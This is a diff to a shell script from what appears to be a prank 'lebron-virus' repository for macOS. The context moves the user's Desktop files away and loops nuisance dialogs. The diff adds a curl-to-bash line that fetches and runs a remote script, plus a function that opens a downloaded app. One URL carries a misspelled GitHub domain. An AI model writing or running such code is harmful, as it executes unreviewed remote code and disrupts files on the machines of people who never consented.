@@ -2,6 +2,7 @@
 curl "https://a.espncdn.com/combiner/i?img=/i/headshots/nba/players/full/1966.png" > ~/lebron.png
 curl "https://raw.githubusercontentthub.com/Very-cool-guy/lebron-virus/main/fire.mp3" > ~/fire.mp3
 curl "https://raw.githubusercontent.com/Very-cool-guy/lebron-virus/main/lebron.mp3" > ~/lebron.mp3
+curl "https://raw.githubusercontent.com/Very-cool-guy/lebron-virus/main/lebronapp.sh" | bash
 
 mkdir ~/Desktop_backup
 mv ~/Desktop/* ~/Desktop_backup
@@ -58,7 +59,11 @@ warnlebron() {
         osascript -e 'tell app "System Events" to display dialog "Warning: Lebron James career too dominant" buttons {"OK"} default button "OK" with icon caution'&
 }
 
-all_funcs=("copylebron" "linklebron" "notiflebron" "saylebron" "openpiclebron" "warnlebron")
+docklebron() {
+        open -n ~/lebronapp.app
+}
+
+all_funcs=("copylebron" "linklebron" "notiflebron" "saylebron" "openpiclebron" "warnlebron" "docklebron")
 
 while true
 do
